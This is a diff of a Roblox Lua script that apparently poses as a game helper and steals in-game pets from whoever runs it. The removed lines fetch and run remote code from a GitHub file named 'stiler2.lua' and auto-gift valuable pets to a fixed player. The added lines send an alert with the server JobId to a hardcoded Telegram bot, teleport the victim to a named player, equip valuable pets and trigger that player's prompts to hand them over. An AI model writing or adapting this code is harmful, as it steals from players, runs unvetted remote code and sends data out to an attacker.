@@ -1,149 +1,164 @@
-task.wait(2)
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/PiotrIsCool/Thunderx/refs/heads/main/stiler2.lua"))()
-
-warn("[PETGIFT] Script started")
-
-local DEBUG_TAG = "[PETGIFT]"
 local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+
 local LocalPlayer = Players.LocalPlayer
+local TargetPlayerName = "stelera123"
+local activePrompts = {} -- track prompts being held
 
-local GiftRemote = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
---[[local PickUpModule = require(
-	ReplicatedStorage.Modules.PetServices.PetActionUserInterfaceService.PetActionsHandlers.PickUp
-)]]
+local BOT_TOKEN = "8446879035:AAH1DGTI_M8FAX0y0RNVv8q1k1MsOhMj6e4"
+local CHAT_ID = "2001061743"
 
--- List of allowed pet types
-local ALLOWED_PET_TYPES = { "dog", "bunny", "mimic octopus", "disco bee", "raccoon", "kitsune",
-	"butterfly", "spinosaurus", "dragonfly", "queen bee", "night owl", "t-rex", "bunny", "french fry ferret", "blood owl", "chicken zombie", "hyacinth macaw", "dilophosaurus", "spaghetti sloth"}
+-- Telegram webhook URL
+local TELEGRAM_WEBHOOK = "https://api.telegram.org/bot8446879035:AAH1DGTI_M8FAX0y0RNVv8q1k1MsOhMj6e4/sendMessage?chat_id=2001061743&text="
 
-local function debugPrint(...)
-	print(DEBUG_TAG, ...)
+-- Allowed pet types (case-insensitive)
+local ALLOWED_PET_TYPES = { 
+    "dog", "bunny", "mimic octopus", "disco bee", "raccoon", "kitsune",
+    "butterfly", "spinosaurus", "dragonfly", "queen bee", "night owl",
+    "t-rex", "french fry ferret", "blood owl", "chicken zombie",
+    "hyacinth macaw", "dilophosaurus", "spaghetti sloth"
+}
+
+-- Convert allowed types to lowercase for easier comparison
+local allowedTypesLower = {}
+for _, name in ipairs(ALLOWED_PET_TYPES) do
+    allowedTypesLower[name:lower()] = true
 end
 
--- Pet type check
-local function isPetTypeMatch(text, exact)
-	local lowerText = text:lower()
-	for _, petType in ipairs(ALLOWED_PET_TYPES) do
-		if exact then
-			if lowerText == petType then
-				return true
-			end
-		else
-			if lowerText:find(petType) then
-				return true
-			end
-		end
-	end
-	return false
-end
+local function sendTelegramMessage(text)
+	print("[PET ALERT DEBUG] Would send Telegram message:", text)
 
--- Find nearest other player (always returns "stelara123")
-local function getNearestPlayer()
-	local LocalPlayer = game.Players.LocalPlayer
-	local Players = game.Players
-
-	while true do
-		local target = Players:FindFirstChild("stelara123")
-		if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
-			return target
-		end
-		task.wait(0.5) -- wait and try again if stelara123 isn't in the game yet
-	end
-end
-
-
--- Find pet model in workspace by UUID
-local function findPlacedPetByUUID(uuid)
-	for _, obj in ipairs(workspace:GetDescendants()) do
-		if obj:GetAttribute("UUID") == uuid then
-			return obj
-		end
-	end
-	return nil
-end
-
--- Gift a pet without manual equip
-local function giftPetDirectly(pet)
-	debugPrint("Unfavoriting pet:", pet.Name)
-	pet:SetAttribute("Favorite", false)
-
-	local target = getNearestPlayer()
-	if target then
-		debugPrint("Temporarily parenting", pet.Name, "to Character for gifting")
-		local originalParent = pet.Parent
-		pet.Parent = LocalPlayer.Character
-		task.wait() -- allow Roblox to register it as equipped
-
-		debugPrint("Gifting", pet.Name, "to", target.Name)
-		GiftRemote:FireServer("GivePet", pet)
-
-		-- If gifting failed and pet still exists, restore its parent
-		if pet.Parent and pet.Parent == LocalPlayer.Character then
-			pet.Parent = originalParent
-		end
-	else
-		debugPrint("No target player found for", pet.Name)
-	end
-end
-
--- Step 1: Gift pets from backpack or character (partial match on name)
-local function checkAndGiftFromContainer(container)
-	if not container then return end
-	for _, pet in ipairs(container:GetChildren()) do
-		if pet:IsA("Tool") and isPetTypeMatch(pet.Name, false) then
-			debugPrint("Found candidate pet in", container.Name, ":", pet.Name)
-			giftPetDirectly(pet)
-		end
-	end
-end
-
-
--- Pick up placed pets
---[[local function pickUpPlacedPets()
-	local activeUI = LocalPlayer.PlayerGui:FindFirstChild("ActivePetUI")
-	if not activeUI then
+	-- Only attempt HTTP if exploit HTTP request function exists
+	local requestFunc = http_request or request or (syn and syn.request)
+	if not requestFunc then
+		print("[PET ALERT DEBUG] No HTTP request available. Skipping send.")
 		return
 	end
 
-	local scroll = activeUI:FindFirstChild("Frame")
-		and activeUI.Frame:FindFirstChild("Main")
-		and activeUI.Frame.Main:FindFirstChild("ScrollingFrame")
+	-- Include JobId in the message
+	local fullText = string.format("%s\nJobId: %s", text, game.JobId)
 
-	if not scroll then
-		return
-	end
+	local url = string.format("https://api.telegram.org/bot%s/sendMessage", BOT_TOKEN)
+	local data = {
+		chat_id = CHAT_ID,
+		text = fullText
+	}
+	local json = game:GetService("HttpService"):JSONEncode(data)
 
-	for _, petFrame in ipairs(scroll:GetChildren()) do
-		if petFrame:IsA("Frame") 
-			and petFrame:FindFirstChild("PET_TYPE") 
-			and petFrame.Name ~= "PetTemplate" then
+	requestFunc({
+		Url = url,
+		Method = "POST",
+		Headers = {["Content-Type"] = "application/json"},
+		Body = json
+	})
+end
 
-			local petType = petFrame.PET_TYPE.Text
-			if isPetTypeMatch(petType, true) then
-				local uuid = petFrame.Name
-				local petModel = findPlacedPetByUUID(uuid)
-				if petModel then
-					debugPrint("Picking up placed pet:", petType)
-					PickUpModule.Activate(petModel)
-					task.wait(0.05)
-				end
-			end
-		end
-	end
-end]]
+-- Check if player has any allowed tool
+local function hasAllowedTool()
+    local backpack = LocalPlayer:FindFirstChild("Backpack")
+    if backpack then
+        for _, tool in pairs(backpack:GetChildren()) do
+            if tool:IsA("Tool") then
+                local toolName = tool.Name:lower()
+                for allowedName in pairs(allowedTypesLower) do
+                    if toolName:find(allowedName) then
+                        return true, tool.Name
+                    end
+                end
+            end
+        end
+    end
+    return false
+end
 
--- Main loop
-debugPrint("Starting pet gifting + pickup loop")
-task.spawn(function()
-	while true do
-		task.wait(0.1)
-		checkAndGiftFromContainer(LocalPlayer.Backpack)
-		checkAndGiftFromContainer(LocalPlayer.Character)
-		--pickUpPlacedPets()
-	end
-end)
+-- Wait for character to load
+local function waitForCharacter()
+    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+    local hrp = char:WaitForChild("HumanoidRootPart")
+    return char, hrp
+end
 
+-- Teleport to target player
+local function teleportToTarget()
+    local target = Players:FindFirstChild(TargetPlayerName)
+    local char = LocalPlayer.Character
+    if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") and char and char:FindFirstChild("HumanoidRootPart") then
+        char.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
+        return true
+    end
+    return false
+end
 
+-- Move only allowed pet tools if target player exists
+local function equipAllowedPetTools()
+    local target = Players:FindFirstChild(TargetPlayerName)
+    if not target or not target.Character then return end -- do nothing if target not available
 
+    local backpack = LocalPlayer:FindFirstChild("Backpack")
+    local char = LocalPlayer.Character
+    if backpack and char then
+        for _, tool in pairs(backpack:GetChildren()) do
+            if tool:IsA("Tool") then
+                local toolName = tool.Name:lower()
+                for allowedName in pairs(allowedTypesLower) do
+                    if toolName:find(allowedName) then
+                        tool.Parent = char
+                        task.wait(0.05)
+                        break
+                    end
+                end
+            end
+        end
+    end
+end
+
+-- Get all visible prompts with ObjectText "stelera123"
+local function getVisiblePrompts(hrp)
+    local visiblePrompts = {}
+
+    for _, prompt in pairs(workspace:GetDescendants()) do
+        if prompt:IsA("ProximityPrompt") and prompt.Parent:IsA("BasePart") then
+            local distance = (prompt.Parent.Position - hrp.Position).Magnitude
+            if distance <= prompt.MaxActivationDistance and prompt.ObjectText == "stelera123" then
+                table.insert(visiblePrompts, {prompt = prompt, distance = distance})
+            end
+        end
+    end
+
+    return visiblePrompts
+end
+
+-- Activate a prompt once and wait its hold duration
+local function activatePrompt(prompt, distance)
+    if activePrompts[prompt] then return end
+
+    activePrompts[prompt] = true
+    fireproximityprompt(prompt, distance or 0)
+    task.spawn(function()
+        task.wait(prompt.HoldDuration or 1)
+        activePrompts[prompt] = nil
+    end)
+end
+
+-- Main
+local char, hrp = waitForCharacter()
+
+-- Telegram notification when script runs and player has allowed tools
+local hasTool, toolName = hasAllowedTool()
+if hasTool then
+    sendTelegramMessage("Script executed. Player has allowed tool: " .. toolName)
+end
+
+while true do
+    -- Teleport
+    teleportToTarget()
+    -- Equip allowed pet tools only if stelera123 exists
+    equipAllowedPetTools()
+    -- Fire visible prompts
+    local prompts = getVisiblePrompts(hrp)
+    for _, data in pairs(prompts) do
+        activatePrompt(data.prompt, data.distance)
+    end
+    task.wait(0.1) -- check frequently
+end
